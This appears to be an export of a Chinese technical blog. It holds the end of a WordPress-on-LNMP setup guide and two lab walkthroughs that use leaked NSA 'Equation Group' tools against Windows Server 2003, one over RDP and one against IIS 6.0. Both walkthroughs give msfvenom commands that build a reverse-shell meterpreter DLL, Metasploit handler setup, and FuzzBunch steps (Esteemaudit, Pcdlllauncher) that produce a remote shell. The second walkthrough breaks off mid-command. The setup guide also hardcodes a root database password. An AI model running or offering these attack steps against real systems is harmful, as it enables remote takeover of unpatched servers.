class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span> default_server;<br><span class="hljs-comment"># listen [::]:80 default_server;</span><br><span class="hljs-attribute">server_name</span> _;<br><span class="hljs-attribute">root</span> /usr/share/nginx/html;<br><br><span class="hljs-comment"># Load configuration files for the default server block.</span><br><span class="hljs-attribute">include</span> /etc/nginx/default.d/<span class="hljs-regexp">*.conf</span>;<br><br><span class="hljs-section">location</span> / &#123;<br>&#125;<br><br><span class="hljs-attribute">error_page</span> <span class="hljs-number">404</span> /<span class="hljs-number">404</span>.html;<br><span class="hljs-section">location</span> = /40x.html &#123;<br>&#125;<br><br><span class="hljs-attribute">error_page</span> <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /50x.html;<br><span class="hljs-section">location</span> = /50x.html &#123;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-修改完成后，启动-Nginx："><a href="#3-修改完成后，启动-Nginx：" class="headerlink" title="3.修改完成后，启动 Nginx："></a>3.修改完成后，启动 Nginx：</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx</span><br></code></pre></td></tr></table></figure><h4 id="4-将-Nginx-设置为开机自动启动："><a href="#4-将-Nginx-设置为开机自动启动：" class="headerlink" title="4.将 Nginx 设置为开机自动启动："></a>4.将 Nginx 设置为开机自动启动：</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">chkconfig</span> nginx <span class="hljs-literal">on</span><br></code></pre></td></tr></table></figure><h3 id="二、安装MySQL"><a href="#二、安装MySQL" class="headerlink" title="二、安装MySQL"></a>二、安装MySQL</h3><h4 id="1-使用-yum-安装-MySQL："><a href="#1-使用-yum-安装-MySQL：" class="headerlink" title="1.使用 yum 安装 MySQL："></a>1.使用 yum 安装 MySQL：</h4><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">yum install mysql-<span class="hljs-keyword">server</span> -y<br></code></pre></td></tr></table></figure><h4 id="2-安装完成后，启动-MySQL-服务："><a href="#2-安装完成后，启动-MySQL-服务：" class="headerlink" title="2.安装完成后，启动 MySQL 服务："></a>2.安装完成后，启动 MySQL 服务：</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service mysqld restart</span><br></code></pre></td></tr></table></figure><h4 id="3-设置-MySQL-账户-root-密码："><a href="#3-设置-MySQL-账户-root-密码：" class="headerlink" title="3.设置 MySQL 账户 root 密码："></a>3.设置 MySQL 账户 root 密码：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin/mysqladmin -u root password <span class="hljs-string">&#x27;MyPas$word4Word_Press&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="4-将-MySQL-设置为开机自动启动："><a href="#4-将-MySQL-设置为开机自动启动：" class="headerlink" title="4.将 MySQL 设置为开机自动启动："></a>4.将 MySQL 设置为开机自动启动：</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">chkconfig</span> mysqld <span class="hljs-literal">on</span><br></code></pre></td></tr></table></figure><h3 id="三、安装PHP"><a href="#三、安装PHP" class="headerlink" title="三、安装PHP"></a>三、安装PHP</h3><h4 id="1-使用-yum-安装-PHP："><a href="#1-使用-yum-安装-PHP：" class="headerlink" title="1.使用 yum 安装 PHP："></a>1.使用 yum 安装 PHP：</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> php-fpm php-mysql -y<br></code></pre></td></tr></table></figure><h4 id="2-安装之后，启动-PHP-FPM-进程："><a href="#2-安装之后，启动-PHP-FPM-进程：" class="headerlink" title="2.安装之后，启动 PHP-FPM 进程："></a>2.安装之后，启动 PHP-FPM 进程：</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service php-fpm <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure><h4 id="3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口"><a href="#3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口" class="headerlink" title="3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口"></a>3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat <span class="hljs-punctuation">-</span>nlpt <span class="hljs-string">| grep php-fpm</span><br></code></pre></td></tr></table></figure><h4 id="4-把-PHP-FPM-也设置成开机自动启动："><a href="#4-把-PHP-FPM-也设置成开机自动启动：" class="headerlink" title="4.把 PHP-FPM 也设置成开机自动启动："></a>4.把 PHP-FPM 也设置成开机自动启动：</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">chkconfig</span> php-fpm <span class="hljs-literal">on</span><br></code></pre></td></tr></table></figure><h3 id="安装wordpress"><a href="#安装wordpress" class="headerlink" title="安装wordpress"></a>安装wordpress</h3><h4 id="1-配置好-LNMP-环境后，继续使用-yum-来安装-WordPress："><a href="#1-配置好-LNMP-环境后，继续使用-yum-来安装-WordPress：" class="headerlink" title="1.配置好 LNMP 环境后，继续使用 yum 来安装 WordPress："></a>1.配置好 LNMP 环境后，继续使用 yum 来安装 WordPress：</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> wordpress -y<br></code></pre></td></tr></table></figure><h4 id="2-进入-MySQL："><a href="#2-进入-MySQL：" class="headerlink" title="2.进入 MySQL："></a>2.进入 MySQL：</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -uroot --password=<span class="hljs-string">&#x27;MyPas<span class="hljs-variable">$word4Word_Press</span>&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="3-为-WordPress-创建一个数据库："><a href="#3-为-WordPress-创建一个数据库：" class="headerlink" title="3.为 WordPress 创建一个数据库："></a>3.为 WordPress 创建一个数据库：</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> wordpress;<br></code></pre></td></tr></table></figure><h4 id="4-MySQL-部分设置完了，我们退出-MySQL-环境："><a href="#4-MySQL-部分设置完了，我们退出-MySQL-环境：" class="headerlink" title="4.MySQL 部分设置完了，我们退出 MySQL 环境："></a>4.MySQL 部分设置完了，我们退出 MySQL 环境：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h4 id="5-把上述的-DB-配置同步到-WordPress-的配置文件中，可参考下面的配置："><a href="#5-把上述的-DB-配置同步到-WordPress-的配置文件中，可参考下面的配置：" class="headerlink" title="5.把上述的 DB 配置同步到 WordPress 的配置文件中，可参考下面的配置："></a>5.把上述的 DB 配置同步到 WordPress 的配置文件中，可参考下面的配置：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs php">wp-config.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* The base configuration for WordPress</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* The wp-config.php creation script uses this file during the</span><br><span class="hljs-comment">* installation. You don&#x27;t have to use the web site, you can</span><br><span class="hljs-comment">* copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* This file contains the following configurations:</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* * MySQL settings</span><br><span class="hljs-comment">* * Secret keys</span><br><span class="hljs-comment">* * Database table prefix</span><br><span class="hljs-comment">* * ABSPATH</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* <span class="hljs-doctag">@link</span> https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* <span class="hljs-doctag">@package</span> WordPress</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-comment">/** The name of the database for WordPress */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;wordpress&#x27;</span>);<br><br><span class="hljs-comment">/** MySQL database username */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><br><span class="hljs-comment">/** MySQL database password */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;MyPas$word4Word_Press&#x27;</span>);<br><br><span class="hljs-comment">/** MySQL hostname */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br><br><span class="hljs-comment">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_CHARSET&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br><br><span class="hljs-comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br><span class="hljs-comment">/**#@+</span><br><span class="hljs-comment">* Authentication Unique Keys and Salts.</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* Change these to different unique phrases!</span><br><span class="hljs-comment">* You can generate these using the &#123;<span class="hljs-doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="hljs-comment">* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* <span class="hljs-doctag">@since</span> 2.6.0</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;AUTH_KEY&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SECURE_AUTH_KEY&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOGGED_IN_KEY&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;NONCE_KEY&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;AUTH_SALT&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOGGED_IN_SALT&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;NONCE_SALT&#x27;</span>, <span class="hljs-string">&#x27;put your unique phrase here&#x27;</span>);<br><br><span class="hljs-comment">/**#@-*/</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* WordPress Database Table prefix.</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* You can have multiple installations in one database if you give each</span><br><span class="hljs-comment">* a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">&#x27;wp_&#x27;</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* See http://make.wordpress.org/core/2013/10/25/the-definitive-guide-to-disabling-auto-updates-in-wordpress-3-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* Disable all file change, as RPM base installation are read-only */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DISALLOW_FILE_MODS&#x27;</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">/* Disable automatic updater, in case you want to allow</span><br><span class="hljs-comment">above FILE_MODS for plugins, themes, ... */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;AUTOMATIC_UPDATER_DISABLED&#x27;</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">/* Core update is always disabled, WP_AUTO_UPDATE_CORE value is ignore */</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* For developers: WordPress debugging mode.</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* Change this to true to enable the display of notices during development.</span><br><span class="hljs-comment">* It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="hljs-comment">* in their development environments.</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* For information on other constants that can be used for debugging,</span><br><span class="hljs-comment">* visit the Codex.</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* <span class="hljs-doctag">@link</span> https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WP_DEBUG&#x27;</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">/* That&#x27;s all, stop editing! Happy blogging. */</span><br><br><span class="hljs-comment">/** Absolute path to the WordPress directory. */</span><br><span class="hljs-keyword">if</span> ( !<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">&#x27;ABSPATH&#x27;</span>) )<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;ABSPATH&#x27;</span>, <span class="hljs-string">&#x27;/usr/share/wordpress&#x27;</span>);<br><br><span class="hljs-comment">/** Sets up WordPress vars and included files. */</span><br><span class="hljs-keyword">require_once</span>(ABSPATH . <span class="hljs-string">&#x27;wp-settings.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="WordPress-已经安装完毕，我们配置-Nginx-把请求转发给-PHP-FPM-来处理"><a href="#WordPress-已经安装完毕，我们配置-Nginx-把请求转发给-PHP-FPM-来处理" class="headerlink" title="WordPress 已经安装完毕，我们配置 Nginx 把请求转发给 PHP-FPM 来处理"></a>WordPress 已经安装完毕，我们配置 Nginx 把请求转发给 PHP-FPM 来处理</h4><p>首先，重命名默认的配置文件：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> /etc/nginx/<span class="hljs-keyword">conf</span>.<span class="hljs-keyword">d</span>/<br>mv default.<span class="hljs-keyword">conf</span> defaut.<span class="hljs-keyword">conf</span>.bak<br></code></pre></td></tr></table></figure><p>在 /etc/nginx/conf.d 创建 wordpress.conf 配置，参考下面的内容：</p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs glsl">wordpress.conf<br>server &#123;<br>listen <span class="hljs-number">80</span>;<br>root /usr/share/wordpress;<br><span class="hljs-keyword">location</span> / &#123;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.php <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>try_files $uri $uri/ /<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">index</span>.php;<br>&#125;<br><span class="hljs-meta"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="hljs-keyword">location</span> ~ .php$ &#123;<br>fastcgi_pass <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9000</span>;<br>fastcgi_index <span class="hljs-keyword">index</span>.php;<br>fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;<br>include fastcgi_params;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-配置后，通知-Nginx-进程重新加载："><a href="#6-配置后，通知-Nginx-进程重新加载：" class="headerlink" title="6.配置后，通知 Nginx 进程重新加载："></a>6.配置后，通知 Nginx 进程重新加载：</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -s reload</span><br></code></pre></td></tr></table></figure><h3 id="至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面"><a href="#至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面" class="headerlink" title="至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面"></a>至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面</h3>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSA工具包验证之RDP漏洞利用</title>
    <link href="/2017/06/post162/"/>
    <url>/2017/06/post162/</url>
    
    <content type="html"><![CDATA[<h3 id="验证环境："><a href="#验证环境：" class="headerlink" title="验证环境："></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href="https://www.python.org/download/releases/2.6.6/">安装python2.6.6</a>, <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p><p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p><p>目标机1(本次演示IP：172.16.12.4)：开放了3389端口的Windows Server 2003</p><p>以上所有IP之间均可以直接访问</p><h3 id="验证步骤："><a href="#验证步骤：" class="headerlink" title="验证步骤："></a>验证步骤：</h3><span id="more"></span><h4 id="第一步：生成可执行的恶意dll文件"><a href="#第一步：生成可执行的恶意dll文件" class="headerlink" title="第一步：生成可执行的恶意dll文件"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01<br>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：</p><img src="/2017/06/post162/1.jpg" class="" title="1.jpg"><p>0x02<br>执行命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=172.16.12.2 <span class="hljs-attribute">LPORT</span>=5555 -f dll &gt;s.dll<br></code></pre></td></tr></table></figure><p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell<br>0x03<br>点击xshell如图位置</p><img src="/2017/06/post162/3.jpg" class="" title="3.jpg"><p>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图</p><img src="/2017/06/post162/4.jpg" class="" title="4.jpg"><h4 id="第二步：配置kali使得kali处于监听状态"><a href="#第二步：配置kali使得kali处于监听状态" class="headerlink" title="第二步：配置kali使得kali处于监听状态"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01<br>依次输入命令</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> lhost <span class="hljs-comment">172.16.12.2</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 5555</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">PAYLOAD windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br>exploit<br></code></pre></td></tr></table></figure><p>看到如图即说明配置成功</p><img src="/2017/06/post162/2.jpg" class="" title="2.jpg"><p>这时就可以将xshell最小化，等后边再用</p><h4 id="第三步：使用方程式工具包进行攻击"><a href="#第三步：使用方程式工具包进行攻击" class="headerlink" title="第三步：使用方程式工具包进行攻击"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01<br>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错</p><img src="/2017/06/post162/5.jpg" class="" title="5.jpg"><p>0x02<br>打开命令提示符，输入</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\win\fb.py<br></code></pre></td></tr></table></figure><p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图</p><img src="/2017/06/post162/1-16273800337215.jpg" class="" title="1.jpg"><p>最后敲击回车<br>0x03<br>显示出<code>fb &gt;</code>之后输入命令</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> Esteemaudit<br></code></pre></td></tr></table></figure><p>使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可<br>（设置监听还是连接、系统位数、系统版本）</p><img src="/2017/06/post162/2-16273801063656.jpg" class="" title="2.jpg"><p>（回拨IP以及端口，端口号可以任意设置）</p><img src="/2017/06/post162/3-16273801178697.jpg" class="" title="3.jpg"><p>（配置DLL路径，需要改为实际路径）</p><img src="/2017/06/post162/4-16273801287108.jpg" class="" title="4.jpg"><p>之后几个回车即可看到连接成功，如图</p><img src="/2017/06/post162/5-16273801405719.jpg" class="" title="5.jpg"><p>0x04<br>接着输入命令</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> Pcdlllauncher<br></code></pre></td></tr></table></figure><p>使用Pcdlllauncher，除了下图其他保持默认即可<br>（改为自己的实际路径）</p><img src="/2017/06/post162/6.jpg" class="" title="6.jpg"><p>（之前生成的s.dll路径）</p><img src="/2017/06/post162/7.jpg" class="" title="7.jpg"><p>之后不断回车，会看到如图</p><img src="/2017/06/post162/10.jpg" class="" title="10.jpg"><p>不用理他，打开xshell可以看到已经成功反弹shell，如下图</p><img src="/2017/06/post162/8.jpg" class="" title="8.jpg"><p>然后就可以比如说输入shell模拟终端执行命令了</p><img src="/2017/06/post162/9.jpg" class="" title="9.jpg">]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSA工具包验证之IIS6.0漏洞利用</title>
    <link href="/2017/06/post164/"/>
    <url>/2017/06/post164/</url>
    
    <content type="html"><![CDATA[<h3 id="验证环境："><a href="#验证环境：" class="headerlink" title="验证环境："></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href="https://www.python.org/download/releases/2.6.6/">安装python2.6.6</a>, <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p><p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p><p>目标机1(本次演示IP：172.16.12.3)：开放了80端口的Windows Server 2003 R2，IIS6.0，开启了Webdav功能</p><p>以上所有IP之间均可以直接访问</p><span id="more"></span><h3 id="验证步骤："><a href="#验证步骤：" class="headerlink" title="验证步骤："></a>验证步骤：</h3><hr><h4 id="第一步：生成可执行的恶意dll文件"><a href="#第一步：生成可执行的恶意dll文件" class="headerlink" title="第一步：生成可执行的恶意dll文件"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01</p><p>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：</p><img src="/2017/06/post164/1.jpg" class="" title="1.jpg"><p>0x02</p><p>执行命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=172.16.12.2 <span class="hljs-attribute">LPORT</span>=5555 -f dll &gt;s.dll<br></code></pre></td></tr></table></figure><p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell</p><p>0x03</p><p>点击xshell如图位置</p><img src="/2017/06/post164/3.jpg" class="" title="3.jpg"><p>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图</p><img src="/2017/06/post164/4.jpg" class="" title="4.jpg"><h4 id="第二步：配置kali使得kali处于监听状态"><a href="#第二步：配置kali使得kali处于监听状态" class="headerlink" title="第二步：配置kali使得kali处于监听状态"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01</p><p>依次输入命令</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> lhost <span class="hljs-comment">172.16.12.2</span><br><span 